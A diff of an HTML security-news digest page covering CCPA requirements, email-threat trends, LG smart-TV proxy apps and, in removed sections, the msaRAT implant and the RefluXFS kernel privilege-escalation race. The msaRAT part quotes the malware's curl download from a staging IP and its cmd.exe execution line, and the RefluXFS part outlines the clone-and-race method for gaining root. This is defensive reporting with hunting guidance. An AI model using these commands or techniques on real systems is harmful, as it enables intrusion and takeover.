+Cybersecurity Requirements
+CCPA defines 18 top-level cybersecurity requirements, some of which contain additional subrequirements.
+The requirement text shown below is all that CCPA provides. These requirements are fairly vague, which may leave some businesses wondering what is considered good enough to meet them. The answer is a solid “it depends.” CCPA states that the cybersecurity program should be “appropriate to the business’s size and complexity and the nature and scope of its processing activities, taking into account the state of the art and cost of implementing the components of a cybersecurity program.” This means there “good enough” varies based on the resources available to the business and how it handles personal information.
+- A business that handles enormous volumes of personal information, including sensitive personal information, across many thousands of devices and retains that information for extended periods of time would be expected to implement each of the requirements in a much more robust way than another business that handles low volumes of personal information on only a few devices, never handles sensitive personal information, and does not retain personal information for very long.
+- Similarly, a small mom-and-pop shop would not have the resources to implement a complex cybersecurity program or have one as thorough as that of a large enterprise with enough resources to staff a dedicated Information Security department.
+The full list of requirements includes:
+Number | Requirement | Subrequirements |
+|---|---|---|
+1 | Authentication | (A) Multi-factor authentication (including multi-factor authentication that is resistant to phishing attacks for employees, independent contractors, and any other personnel, service providers, and contractors). (B) If the business uses passwords or passphrases, strong unique passwords or passphrases (e.g., passwords that are at least eight characters in length, not on the business’s disallowed list of commonly used passwords, and not reused). |
+2 | Encryption of personal information, at rest and in transit. | None |
+3 | Account management and access controls | (A) Restricting each person’s, account’s, or application’s privileges and access to personal information to what is necessary for that person, account, or application to perform their duties. For example:
+(B) Restricting the number of privileged accounts, restricting those privileged accounts’ access functions to only those necessary to perform the account-holder’s job, restricting the use of privileged accounts to when they are necessary to perform functions, and using a privileged-access management solution (e.g., to ensure just-in-time temporary assignment of privileged access). (C) Restricting and monitoring the creation of new accounts for employees, independent contractors, or other personnel; service providers or contractors; and privileged accounts, and ensuring that the accounts’ access and privileges are limited as set forth in subsections (c)(3)(A) and (B). (D) Restricting and monitoring physical access to personal information (e.g., through the use of badges, secure physical file locations, and enforcement of clean-desk policies). |
+4 | Inventory and management of personal information and the business’s information system | (A) Personal information inventories (e.g., maps and flows identifying where personal information is stored, and how it can be accessed) and the classification and tagging of personal information (e.g., how personal information is tagged and how those tags are used to control the use and disclosure of personal information). (B) Hardware and software inventories, and the use of allowlisting (i.e., discrete lists of authorized hardware and software to control what is permitted to connect to and execute on the business’s information system). (C) Hardware and software approval processes, and preventing the connection of unauthorized hardware and devices to the business’s information system. |
+5 | Secure configuration of hardware and software | (A) Software updates and upgrades; (B) Securing on-premises and cloud-based environments; (C) Masking (i.e., systematically removing or replacing with symbols such as asterisks or bullets) the sensitive personal information set forth in Civil Code section 1798.145, subdivisions (ae)(1)(A) and (B) and other personal information as appropriate by default in applications; (D) Security patch management (e.g., receiving systematic notifications of security-related software updates and upgrades; and identifying, deploying, and verifying their implementation); (E) Change management (i.e., processes and procedures to ensure that changes to information system(s) do not undermine existing safeguards). |
+6 | Internal and external vulnerability scans, penetration testing, and vulnerability disclosure and reporting (e.g., bug bounty and ethical hacking programs). | None |
+7 | Audit-log management, including the centralized storage, retention, and monitoring of logs. | None |
+8 | Network monitoring and defenses | (A) Technologies, such as bot-detection, intrusion-detection, and intrusion-prevention, which a business may use to detect unsuccessful login attempts, monitor the activity of authorized users, and detect and prevent unauthorized access, destruction, use, modification, or disclosure of personal information; or unauthorized activity resulting in the loss of availability of personal information; (B) Data-loss-prevention systems (e.g., software to detect and prevent unauthorized access, use, or disclosure of personal information). |
+9 | Antivirus and antimalware protections. | None |
+10 | Segmentation of an information system (e.g., via properly configured firewalls, routers, switches). | None |
+11 | Limitation and control of ports, services, and protocols. | None |
+12 | Cybersecurity awareness, including how the business maintains current knowledge of changing cybersecurity threats and countermeasures. | None |
+13 | Cybersecurity education and training, including training for each employee, independent contractor, and any other personnel to whom the business provides access to its information system (e.g., when their employment or contract begins, annually thereafter, and after a personal information security breach, as described in Civil Code section 1798.150). | None |
+14 | Secure development and coding best practices, including code-reviews and testing. | None |
+15 | Oversight of service providers, contractors, and third parties to ensure compliance with sections 7051 and 7053. | None |
+16 | Retention schedules and proper disposal of personal information no longer required to be retained, by (A) shredding, (B) erasing, or (C) otherwise modifying the personal information in those records to make it unreadable or undecipherable through any means. | None |
+17 | How the business manages its responses to security incidents (i.e., its incident response management). | (A) For the purposes of subsection (17), “security incident” means an occurrence that actually or imminently jeopardizes the confidentiality, integrity, or availability of the business’s information system or the personal information the system processes, stores, or transmits, or that constitutes a violation or imminent threat of violation of the business’s cybersecurity program; unauthorized access, destruction, use, modification, or disclosure of personal information; or unauthorized activity resulting in the loss of availability of personal information is a security incident. (B) The business’s incident response management includes:
+|
+18 | Business-continuity and disaster-recovery plans, including data-recovery capabilities and backups. | None |</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-6" class="article-body">
             <h2 class="article-title">Email threat landscape: Q2 2026 trends and insights</h2>
             <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/" target="_blank">Original Link</a></p>
             <div class="content-text">The second quarter of 2026 (April–June) was largely defined by the continuing downstream effects following Microsoft’s Digital Crimes Unit-led disruption efforts against the [Tycoon2FA phishing-as-a-service (PhaaS) platform](https://www.microsoft.com/en-us/security/blog/2026/03/04/inside-tycoon2fa-how-a-leading-aitm-phishing-kit-operated-at-scale/) in March. Phishing volume linked to the platform fell 92% from pre-disruption averages, including QR code phishing and CAPTCHA-gated phishing both declining from their March highs. Despite ongoing efforts to rebuild operations, Tycoon2FA did not recover its previous scale or influence during Q2, and no single service emerged to replace the platform at comparable scale.
@@ -208,232 +492,7 @@ To hear stories and insights from the Microsoft Threat Intelligence community ab
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">Chaos Ransomware Uses msaRAT to Route C2 Traffic Through Headless Chrome and Edge</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/chaos-ransomware-uses-msarat-to-route.html" target="_blank">Original Link</a></p>
-            <div class="content-text">The [Chaos ransomware group](https://thehackernews.com/2025/07/chaos-raas-emerges-after-blacksuit.html) ran its command-and-control through the victim's own browser. Cisco Talos on Thursday [detailed msaRAT](https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/), the Rust implant behind it, found on a compromised Windows machine ahead of the encryptor.
-The implant never opens an outbound connection of its own. Its process talks to 127.0.0.1
-and nothing else. It starts Chrome or Edge in headless mode and drives the browser over the Chrome DevTools Protocol, the browser's own debugging API.
-Every C2 message travels out from there through a WebRTC data channel relayed by Twilio's TURN service, so what a defender sees on the wire is a browser calling Cloudflare and Twilio. The attacker's own server address never appears at all.
-Chrome Does the Talking
-msaRAT looks for Chrome or Edge through environment variables first, then falls back to the registry for Chrome. If no matching browser is found, the CDP path is skipped.
-When it finds one, it starts the browser without a visible window using --headless=new
-, enables CDP with --remote-debugging-port
-, and points it at a separate --user-data-dir
-.
-Since [Chrome 136](https://developer.chrome.com/blog/remote-debugging-port), Google no longer honors the debugging switch against the default profile, a change announced in March 2025 after [infostealers took up the flag for cookie theft](https://thehackernews.com/2025/05/eddiestealer-malware-uses-clickfix.html). msaRAT brings its own profile directory, so the change does not get in its way. Nothing in Talos's analysis shows it touching the victim's profile at all.
-The malware asks /json/list/
-for a debuggable target and connects to the returned WebSocket URL. It creates a tab, switches off Content Security Policy with Page.setBypassCSP
-, registers five callbacks through Runtime.addBinding
-, and calls Runtime.evaluate
-to inject JavaScript stored in plaintext in the binary's .rdata
-section.
-Four callback names, msaOpen
-, msaClose
-, msaError
-, and msaMessage
-, gave Talos the malware's name. The fifth is dataAck
-.
-That JavaScript fetches STUN and TURN configuration from a Cloudflare Worker at is-01-ast[.]ols-img-12[.]workers[.]dev
-, with Origin and Referer headers disguised as traffic from Microsoft's site. It builds a peer connection and posts an SDP offer to the same endpoint.
-The answer comes back with no ICE candidates and the connection address set to 0.0.0.0
-, so no direct peer-to-peer link can form, and the whole channel runs through Twilio's relay at global.turn.twilio.com
-. Once the data channel is live, the Worker drops out of the path.
-Traffic on that channel is encrypted twice. The browser handles DTLS, and inside it sits a ChaCha-Poly1305-based scheme keyed by an ECDH exchange that starts with a 0xFE
-handshake frame from the C2 immediately after connection.
-The implant passes incoming command frames to cmd.exe /e:ON /v:OFF /d /c <cmd>
-for execution. Talos reads the send queue and flow control as likely built to move large payloads like screenshots or files reliably.
-Neither half of the transport is new. [Praetorian showed in August 2025](https://www.praetorian.com/blog/ghost-calls-abusing-web-conferencing-for-covert-command-control-part-1-of-2/) that conferencing platforms' TURN infrastructure could carry a full C2 channel, and [Sansec found a skimmer in March 2026](https://sansec.io/research/webrtc-skimmer) using [WebRTC data channels to move stolen card data past HTTP inspection](https://thehackernews.com/2026/03/webrtc-skimmer-bypasses-csp-to-steal.html).
-msaRAT puts both inside a Chaos-linked Rust implant that drives a headless browser through CDP.
-The Way In Is the Same as Ever
-msaRAT arrives after the operator already has execution and before the encryptor runs. Talos does not say how this machine was reached. The group's [documented playbook](https://blog.talosintelligence.com/new-chaos-ransomware/) is spam floods, vishing, [Quick Assist](https://thehackernews.com/2024/05/cybercriminals-exploiting-microsofts.html), and RMM tools for persistence.
-The implant itself comes down with a single curl command:
-curl.exe https://172.86.126[.]18:443/update_ms.msi -o C:\programdata\update_ms.msi
-Port 443, plain HTTP. Firewall rules written around port numbers without protocol inspection let it through. The MSI carries property data impersonating a Windows update, and a custom action fires at the end of installation to load an embedded DLL straight into memory.
-That DLL is msaRAT: written in Rust on the Tokio async runtime, exporting a function named RUN
-for the installer to call.
-Hunting Notes
-msaRAT is post-compromise malware and does not depend on a Chrome or Edge vulnerability, so defenders have no browser patch to apply for the technique itself.
-The signal that lasts is process behavior. As Talos puts it, "all external communications are observed as originating from a legitimate browser process." Hunt for Chrome or Edge launched by an installer, a service, or another non-interactive parent with --headless=new
-and --remote-debugging-port
-set.
-Then correlate that process with loopback traffic to the debugging port and outbound WebRTC. Where telemetry captures CDP messages, Runtime.addBinding
-and Runtime.evaluate
-are the pivots. Fleets that run browser automation or CI will have their own headless jobs to tune around.
-As of July 23, 2026, Talos has published no file hashes for msaRAT. The public indicator set is two network artifacts, the staging IP and the Worker hostname, both in its [IOC repository](https://github.com/Cisco-Talos/IOCs/blob/main/2026/07/chaos-msarat.txt). Talos's detection coverage:
-- ClamAV:
-Win.Downloader.ChaosRaas-10060321-0
-- Snort 2:
-1:66839
-,1:66840
-,1:66841
-- Snort 3:
-1:66839
-,1:301587
-Those indicators are useful but narrow. workers.dev
-is [Cloudflare's shared deployment domain](https://developers.cloudflare.com/workers/configuration/routing/workers-dev/), issued to every Workers account, and attackers [used it last year to stage payloads and tunnel C2](https://thehackernews.com/2025/08/attackers-abuse-velociraptor-forensic.html).
-Twilio runs a legitimate STUN and TURN service that real WebRTC applications depend on. Block either at the org level and you break working traffic for everyone who uses them. Talos reads that as the likely reason Cloudflare Workers was picked for signaling.
-Treat this as observed tradecraft rather than a measured campaign. The report does not identify the victim, establish how many organizations received msaRAT, say when the malware entered use, or explain how the Cloudflare Worker and Twilio TURN credentials were obtained.
-The delivery is unremarkable: a curl download, a fake Windows update, a DLL loaded from an MSI. What changes is where the C2 lives afterward, and both indicators Talos published can be swapped out tomorrow. A headless browser spawned by an installer is harder to move, because it is the technique.
-msaRAT checks for two browsers and needs one of them present and allowed out. On a Windows fleet, that is not a demanding requirement.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-2" class="article-body">
-            <h2 class="article-title">New RefluXFS Linux flaw lets attackers gain root privileges</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/linux/new-refluxfs-linux-flaw-lets-attackers-gain-root-privileges/" target="_blank">Original Link</a></p>
-            <div class="content-text">A nine-year-old race condition vulnerability in the Linux kernel's XFS filesystem, tracked as CVE-2026-64600, allows local attackers to overwrite protected files and gain root privileges. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-3" class="article-body">
-            <h2 class="article-title">New msaRAT malware uses Chrome, Edge browsers to route C2 traffic</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/new-msarat-malware-uses-chrome-edge-browsers-to-route-c2-traffic/" target="_blank">Original Link</a></p>
-            <div class="content-text">The Chaos ransomware gang is using a new backdoor dubbed msaRAT that hides command-and-control (C2) communication by routing it through the Chrome or Edge browsers. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-4" class="article-body">
-            <h2 class="article-title">Nine-Year-Old RefluXFS Linux Flaw Gives Local Users Root on Default RHEL Installs</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/nine-year-old-refluxfs-linux-flaw-gives.html" target="_blank">Original Link</a></p>
-            <div class="content-text">[RefluXFS](https://blog.qualys.com/vulnerabilities-threat-research/2026/07/22/refluxfs-a-linux-kernel-local-privilege-escalation-to-root-in-xfs-cve-2026-64600), a Linux kernel flaw disclosed on July 22 and tracked as CVE-2026-64600
-, lets an unprivileged local user overwrite root-owned files on an XFS filesystem and gain persistent root access.
-Qualys said default installations of Red Hat Enterprise Linux and its derivatives, Fedora Server, and Amazon Linux can meet the conditions for exploitation.
-The company demonstrated the race against /etc/passwd
-and setuid-root binaries. The overwrite lands at the block layer. It survives a reboot and leaves the target's ownership, permissions, timestamps, and setuid bit untouched, so a modified setuid-root binary still runs as root.
-The fix was merged on July 16, and Linux vendors have begun shipping backported kernels. The patch traces the bug to Linux 4.11 in 2017: a Fixes:
-tag naming commit 3c68d44a2b49
-and a stable backport request marked # v4.11
-.
-Who is exposed
-Exploitation requires three conditions:
-- The system runs Linux 4.11 or later without the RefluXFS fix.
-- The XFS filesystem was created with
-reflink=1
-. - The readable target and an attacker-writable directory are on the same XFS filesystem.
-Qualys said to patch exposed and multi-tenant systems first, which means any reflink-enabled XFS host where untrusted code can run locally, whether through a shell, a CI job, or a compromised service.
-The advisory lists the default installations that can meet those conditions: Red Hat Enterprise Linux 8, 9, and 10 and their downstream derivatives, Fedora Server 31 and later, Amazon Linux 2023, and Amazon Linux 2 images from December 2022 onward. RHEL 7 filesystems are not affected because they predate XFS reflink support.
-Debian, Ubuntu, SLES, and openSUSE do not generally use XFS for the root filesystem by default. They are exposed only if an administrator chose XFS with reflink enabled at install time.
-Check the root filesystem:
-xfs_info / | grep reflink=
-reflink=1
-means condition two is met. Run the same check on any other mounted XFS volume where a protected file and an attacker-writable directory share the filesystem.
-The Stale Mapping
-An attacker clones a root-owned file into a scratch file with FICLONE
-, which needs only read access on the source, then races concurrent O_DIRECT
-writes against the clone. XFS reflinks use copy-on-write, so both files initially reference the same physical disk blocks.
-The kernel reads the data-fork mapping under the inode lock and hands it to xfs_reflink_fill_cow_hole()
-, which cycles that lock to reserve transaction space.
-A second writer can complete the copy-on-write operation during that gap and remap the cloned file to a new block. When the first writer reacquires the lock, it refreshes the copy-on-write fork but continues using the old data-fork mapping.
-The [upstream patch](https://github.com/torvalds/linux/commit/2f4acd0fcd862e22eab45690ec2c08c80b6ef2e7) describes the failure plainly: "the mappings are stale as soon as we reacquire the ILOCK."
-That stale address now points to a block owned only by the original protected file. XFS sees the block as unshared and permits the direct write, so data intended for the attacker's clone lands in the target instead.
-It is a check-then-use error across a lock cycle. The shared-status query itself is correct; what it queries is a block address captured before the lock was released.
-The Hacker News found the patch touches two helpers, xfs_reflink_fill_cow_hole()
-and xfs_reflink_fill_delalloc()
-. The second carries the same lock-cycle pattern and does not appear in the Qualys advisory.
-Saeed Abbasi, who heads the Qualys Threat Research Unit, told The Hacker News the model found both paths at the same time, because they are so similar. In both, the fix snapshots ip->i_df.if_seq
-before the lock is dropped and re-reads the data fork with xfs_bmapi_read()
-if the counter moved.
-Direct I/O skips the page cache and has no revalidation hook, so the write lands on disk. Because it bypasses the target inode entirely, the metadata never changes, and the researchers said their tests produced no kernel warning or log entry.
-On the test machine, the race usually won in under ten seconds. The published demo strips the root password on a default RHEL 10.2 box.
-Qualys said an AI model found the flaw. The company pointed [Claude Mythos Preview](https://thehackernews.com/2026/04/anthropics-claude-mythos-finds.html), Anthropic's restricted-access frontier model, at the kernel and, per its [technical advisory](https://cdn2.qualys.com/advisory/2026/07/22/RefluXFS.txt), "asked it to find a vulnerability similar to [Dirty COW](https://thehackernews.com/2016/10/linux-kernel-exploit.html)."
-The model located the race, wrote a working root exploit, and drafted the advisory. Researchers then reproduced it on a stock Fedora Server 44 install, checked the model's reasoning, and coordinated disclosure upstream.
-Abbasi said the team changed very little in that draft. They rewrote three sections the model had left as placeholders before the maintainers were contacted: the last-minute note, the acknowledgments and the timeline. They also swapped the epigraphs, replacing the model's quotes from a TV show with song lyrics. "Nothing else," he said.
-Qualys has been finding a lot of these. A day earlier, it disclosed [a snap-confine flaw in Ubuntu Desktop](https://thehackernews.com/2026/07/ubuntu-snap-confine-flaw-could-give.html), CVE-2026-8933
-, where two races let a local user get root on default installs. In May it found [a nine-year-old bug in the kernel's ptrace checks](https://thehackernews.com/2026/05/9-year-old-linux-kernel-flaw-enables.html).
-Patch, Then Reboot
-[Red Hat](https://access.redhat.com/security/cve/CVE-2026-64600) has issued Important-rated kernel advisories across affected RHEL 8, 9, and 10 streams. The errata began landing on July 14, eight days before the coordinated disclosure: RHSA-2026:39179 and RHSA-2026:39180 for RHEL 8 and RHSA-2026:39494 for RHEL 10, with extended-support and SAP streams following through July 17.
-Coverage is stream-specific, so confirm an advisory exists for your exact release. Anyone who applied those errata on schedule was covered before RefluXFS had a name. Check your patch dates before assuming exposure.
-The vendor's [bug tracker](https://bugzilla.redhat.com/show_bug.cgi?id=2498915) files the flaw under the title "kernel: XFS data corruption using reflink." The entry was auto-imported on July 10 and initially described the issue as possible data corruption from reflinking a file.
-As of July 23, [Debian's tracker](https://security-tracker.debian.org/tracker/CVE-2026-64600) listed the fix in trixie-security as kernel 6.12.96-1
-and in unstable as 7.1.4-1
-. Trixie's base kernel 6.12.94-1
-and forky's 7.1.3-1
-were still marked vulnerable, as were bookworm and bullseye, including their security branches.
-There is no mount option or sysctl that disables XFS reflinks after a filesystem has been created, and Qualys said no practical mitigation or temporary configuration change is available. SELinux in Enforcing mode, seccomp, kernel lockdown, and container boundaries all failed to stop it in the company's testing. Memory protections like KASLR and SMEP never applied: this is a block-layer write, not memory corruption.
-One apparent limit is not one. The race only fires if the target's block starts unshared, so a file an administrator already reflink-copied cannot be hit. The advisory says an unprivileged user can reset that condition by running chsh
-, and that setuid-root binaries are unlikely to have been reflinked in the first place.
-Qualys published no standalone exploit code. Red Hat's tracker logged a public proof-of-concept on July 22, pointing at the advisory posted to the oss-security list, which sets out the race and the exploitation steps in full. Abbasi rejected that classification. The exploitation section is "just an overview of the exploitation mechanism," he said, and Qualys will not release its exploit, though it gave the code to the XFS maintainers so they could reproduce the bug and test the fix. None of the vendors tracking the flaw had reported exploitation in the wild at the time of writing.
-The Hacker News has reached out to Red Hat for comment on its assessment of the flaw's impact and will update this story with any response.
-Installing the package does not replace the kernel already running in memory. Apply the vendor update, reboot the system, and verify that it is running the fixed kernel.
-Updated on July 24, 2026, with comment from Qualys.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
-            <h2 class="article-title">CCPA Update: Who’s In Scope (Part 1)</h2>
-            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/ccpa-update-whos-in-scope-part-1" target="_blank">Original Link</a></p>
-            <div class="content-text">CCPA Update: Who’s In Scope (Part 1)
-The state of California has updated the [California Consumer Privacy Act](https://cppa.ca.gov/pdf/20260101_ccpa_statute.pdf) (CCPA) and its [supporting regulations](https://cppa.ca.gov/regulations/pdf/ccpa_statute_eff_20260101.pdf) yet again. The [California Privacy Protection Agency](https://cppa.ca.gov/) (CPPA) oversees compliance with these regulations. This post is the first in a series on CCPA and will cover what organizations CCPA does applies to, including a deep dive into the types of information covered by CCPA, and how CCPA is enforced.
-TrustedSec has years of experience helping organizations implement and audit both cybersecurity and privacy requirements. Please [get in touch with us](https://trustedsec.com/contact) for any questions on the applicability, scope, or requirements of CCPA or other compliance frameworks.
-Overview
-[Applicability](#Applicability)
-CCPA applies to businesses that do business in the State of California and collect consumers’ personal information if they meet certain revenue and/or personal information processing thresholds.
-[Enforcement](#Enforcement)
-CCPA is enforced by CPPA and directly by consumer action via a system of administrative fines and civil penalties for non-compliance as well as additional per-consumer, per-incident damages for breaches.
-Applicability
-CCPA Applicability
-CCPA applies to “businesses,” which is defined in [Cal. Civ. Code §1798.140(d)](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?sectionNum=1798.140.&lawCode=CIV) as all for-profit enterprises, including sole proprietorships, that do business in the State of California and collect, or cause others to collect on their behalf, consumers’ personal information (more on that definition below) if they meet any of the following criteria:
-- Had annual gross revenues in excess of $26,625,000 (as of January 1, 2025) during the previous calendar year
-- Buys, sells, or shares the personal information of 100,000 or more consumers or households annually, alone or in combination
-- Derives 50% or more of its annual revenues from selling or sharing consumers' personal information
-The gross revenue threshold shown above is adjusted for inflation every two (2) years. The CPPA publishes [the current threshold](https://cppa.ca.gov/regulations/cpi_adjustment.html).
-CCPA also applies to:
-- Entities that control or are controlled by a business that meets the criteria above and share common branding with that business
-- Joint ventures and partnerships in which each business has at least a 40% interest
-- Any person that voluntarily certifies that they comply with CCPA
-Organizations that do not meet the definition of businesses shown above, either because they are not for profit, do not collect consumers’ personal information, or do not meet any of the thresholds, do not need to comply with CCPA or its cybersecurity audit requirement.
-Among exemptions related to legal processes and consumer rights, CCPA also explicitly does not apply to:
-- Healthcare providers and medical information governed by California’s Confidentiality of Medical Information Act
-- HIPAA-covered entities and business associates, with respect to Protected Health Information (PHI) governed by the HIPAA Security, Breach Notification, and Privacy Rules
-- Personal information collected as part of a clinical trial or other biomedical research study subject to the Federal Policy for the Protection of Human Subjects with certain conditions
-- Consumer credit reporting
-- Information subject to the Gramm-Leach-Bliley Act
-- Information subject to the Driver’s Privacy Protection Act of 1994
-There are many more exemptions and nuances than can be listed here, so organizations that feel they may be exempt should review the full list at [Cal. Civ. Code §1798.145](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=CIV§ionNum=1798.145.).
-Personal Information
-Some organizations may be confused about whether or not the information they handle meets the definition of personal information under CCPA. This is formally defined in [Cal. Civ. Code §1798.140(v)](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?sectionNum=1798.140.&lawCode=CIV).
-CCPA defines personal information as any information that identifies, relates to, describes, is reasonably capable of being associated with, or could reasonably be linked, directly or indirectly, with a particular consumer or household. This explicitly includes (but is not limited to) the following:
-|
-The following are excluded from the definition of personal information:
-|
-“Publicly available” does not include biometric information collected by a business about a consumer without the consumer’s knowledge.
-Some of the terms used in the definition of personal information (aggregate consumer information, biometric information, deidentified, inference, profiling, and unique personal identifier) are also further defined within [Cal. Civ. Code §1798.140](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?sectionNum=1798.140.&lawCode=CIV) for those who need it but are excluded here to keep this list from getting even longer.
-Any information that meets the definition above is considered personal information regardless of what format it is in. CCPA explicitly lists the following formats as examples that are in scope:
-Physical Formats | Digital Formats | Abstract Digital Formats |
-|---|---|---|
-Paper documents | Text files | Compressed files |
-Printed images | Image files | Encrypted files |
-Vinyl records | Audio files | Metadata |
-Video tapes | Video files | Artificial intelligence systems that are capable of outputting personal information |
-Sensitive Personal Information
-Both the definition of personal information above and the applicability criteria for the CCPA cybersecurity audit requirement reference sensitive personal information, so it is important to understand this definition and how it differs from the definition of personal information. This is formally defined in [Cal. Civ. Code §1798.140(ae)](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?sectionNum=1798.140.&lawCode=CIV) and includes:
-|
-Some of the terms used in the definition of sensitive personal information (biometric information, neural data, and precise geolocation) are also further defined within [Cal. Civ. Code §1798.140](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?sectionNum=1798.140.&lawCode=CIV) for those who need the details.
-As with the definition of personal information, publicly available information is not considered sensitive personal information.
-Enforcement
-Non-compliance with CCPA is enforced via administrative fines and civil penalties of up to:
-- $2,663 for each violation
-- $7,988 for each intentional violation
-- $7,988 for each violation involving the personal information of consumers under the age of 16
-Businesses that are tempted to “fly under the radar” by avoiding compliance and hoping they don’t get caught should also be aware of additional penalties that apply following breaches of nonencrypted and nonredacted personal information. These fines are currently $107-$799 per-consumer, per-incident, or actual damages, whichever is greater. Breaches may also result in injunctive, declaratory, or any other relief a court deems proper. Consumers may initiate actions against a business for these statutory damages on an individual or class basis.
-As with the gross revenue threshold for CCPA applicability, the fines are adjusted for inflation every two (2) years. The CPPA publishes [the current thresholds](https://cppa.ca.gov/regulations/cpi_adjustment.html).
-The CPPA also has the power to launch investigations and conduct its own audits of businesses.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-6" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">LG to Ban Residential Proxies from Smart TV Apps</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/07/lg-to-ban-residential-proxies-from-smart-tv-apps/" target="_blank">Original Link</a></p>
             <div class="content-text">The home appliance giant LG Electronics USA said this week it plans to suspend any apps built for its smart TVs that turn one’s television into an always-on residential proxy node. The move comes less than a month after researchers found that more than 42 percent of games and other apps available for download on LG’s webOS store allow unknown third-parties to route their Internet traffic through a user’s TV.
@@ -452,6 +511,7 @@ LG’s announcement that it is culling residential proxy SDKs from its app store
 Earlier this week, the Youtube channel [Gamers Nexus](https://www.youtube.com/watch?v=Q9uefFYe6bM) showed that certain LG LCD monitors will automatically install [an app](https://apps.microsoft.com/detail/9pm9n6f47jb8?hl=en-US&gl=US) that promotes paid McAfee antivirus subscriptions, and that the app arrives through Windows Update without an approval prompt.
 Update, July 22, 1:06 p.m. ET: Added statement from Bright Data.
 Good – residential proxy providers are scum.
+No they aren’t, they’re the only reason we can use the internet anonymously. Without them, you wouldn’t be able to anonymously access a lot of sites.
 Now if only they’d also stock forcing McAfee on PC users of their monitors via stealth windows updates and kill off the spyware on their smart TV’s that records everything you say and watch etc.
 HOW did anyone at LG think ANY of this was ok? Who is being summarily fired RTFN? LG burned all trust and is a month late in merely promising they’ll BEGIN removing the 42% MALWARE TROJANS from their ‘curated’ app store, and they somehow think that’s going to be good enough? This brand is dead to me forever. This wasn’t just an oversight.
 why do you think the price is so good?
@@ -460,6 +520,7 @@ While there are some incredibly awful device offenders I came across in my actua
 > HOW did anyone at LG think ANY of this was ok
 I mean they are doing this for 15 years and no one complains? At least not in a way that reduces sales? It sure helps a lot that all other big TV manufacturers are as bad, they all want, at the very least, to spy on you with ACR.
 That’s just one of the reasons I don’t buy products made by LG.
+LG = Literally Garbage
 Oh heavens no, they won’t stop anything that profits them, only things that profit other people that they don’t get a cut of.
 A simple solution to scummy data harvesting by TV vendors and their app ecosystems is to not connect the TV to the internet. Connect it to a TV-PC box (home theater PC) instead, where you control the OS and apps that run on it, so you can make it as secure as you want it to be. (Of course that’s moot if you allow family members to install whatever games and other apps they want on it without oversight.)
 A perfectly elegant and workable solution and exactly what I’ve done with every “smart” TV we have in the home. They do not get to connect to my network and their device addresses are specifically blocked from ever connecting to the internet at the firewall level, juuuuust in case someone in my family gets suckered into trying to add to the network.
@@ -479,6 +540,7 @@ Limited also limits what apps you can use.
 ‘Walled garden’ implies a wall to (purport to) keep malware out, a value addition.
 There are obviously levels of integrity and efficacy to evaluate in that value add,
 not all companies that have a store they control are handling the situation equally.
+mayhaps something like the old chinese dude in the shop that didn’t want to sell the mogwai to the traveling salesman.
 Is there a good resource to check if one’s Internet connection is being used as a residential proxy? I just checked with https://whatismylocation.org/proxy-check which says I’m okay, but who really knows?
 I have an LG TV, and use a pihole blocklist to at least do some blocking, but LG has a lot more resources than the person maintaining the blocklist.
 This is really a horrible development, what is the next peripheral that is going to be installing malware?
@@ -505,130 +567,29 @@ If so, is a reasonable privacy, security, and ad-annoyance strategy to:
 3) Get all your streaming from trusted set-top boxes (to hopefully avoid spyware, adware, proxies, etc. that you haven’t signed up for)
 4) Disable internet access on the TV, except when you discover you must do a software upgrade? At the TV and/or the VLAN?
 the app store can’t police the tv box manufacturer which can install whatever modified android it wants
+Yes they can, literally they are the only entity with the power to decide that.
+You have to have allowed it to be in the store. Period slash checkmate.
 You can keep your ad ridden devices. IF I SEE MY MONITOR HAVE ADS ILL THROW IT OUT AND BUY SOMETHING WORTHY.
 2026, the year of the trojaned pac man , smh
 Smart TVs draw a lot of vampire power. I found a simple solution. I make my Smart TV dumb again. How? Look at the network settings. Most likely the IP address is 192.168.1.Something. Change the 192 number to 193, and now your Too smart for it’s own good TV, becomes a normal dumb TV. Also, the internal microphone, and TV camera looking at you will be disabled too. You will also note your power bill will be reduced a bit too. Nice!
